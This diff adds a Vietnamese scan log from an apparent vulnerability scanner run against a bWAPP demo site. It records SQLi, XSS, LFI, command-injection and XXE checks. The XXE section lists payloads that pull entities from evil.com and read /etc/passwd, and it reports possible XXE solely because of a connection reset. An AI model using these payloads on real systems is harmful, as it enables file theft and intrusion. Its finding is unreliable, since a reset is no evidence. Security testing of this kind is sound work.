@@ -1,0 +1,42 @@
+[TIME] 2025-07-24 15:53:38
+[URL] http://bwapp-demo.herokuapp.com/
+[SUMMARY] XXE
+======= SQLi =======
+
+[*] Đang kiểm tra SQL Injection trên: http://bwapp-demo.herokuapp.com/
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[X] Không tìm thấy form để kiểm tra.
+[✓] Không thể thực hiện kiểm tra SQLi.
+
+
+======= XSS =======
+
+[*] Đang kiểm tra XSS trên: http://bwapp-demo.herokuapp.com/
+[!] URL không chứa tham số. Đang thử tìm form để kiểm tra...
+[X] Không tìm thấy form để kiểm tra.
+[✓] Không thể thực hiện kiểm tra XSS.
+
+
+======= LFI =======
+[*] Đang kiểm tra LFI trên: http://bwapp-demo.herokuapp.com/
+[✓] Không phát hiện lỗ hổng LFI.
+
+
+======= CMDi =======
+[*] Đang kiểm tra Command Injection trên: http://bwapp-demo.herokuapp.com/
+[✓] Không phát hiện lỗ hổng CMDi.
+
+
+======= XXE =======
+[*] Đang kiểm tra XXE trên: http://bwapp-demo.herokuapp.com/
+[!] Lỗi khi gửi request: ('Connection aborted.', ConnectionResetError(104, 'Connection reset by peer'))
+[!] Có thể bị tấn công XXE với các payloads:
+    - <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://evil.com/evil"> %xxe; ]>
+    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
+    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    - <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil"> ]>
+    - <?xml version="1.0" ?>
+    - <foo>&xxe;</foo>
+    - <foo>test</foo>
+
+
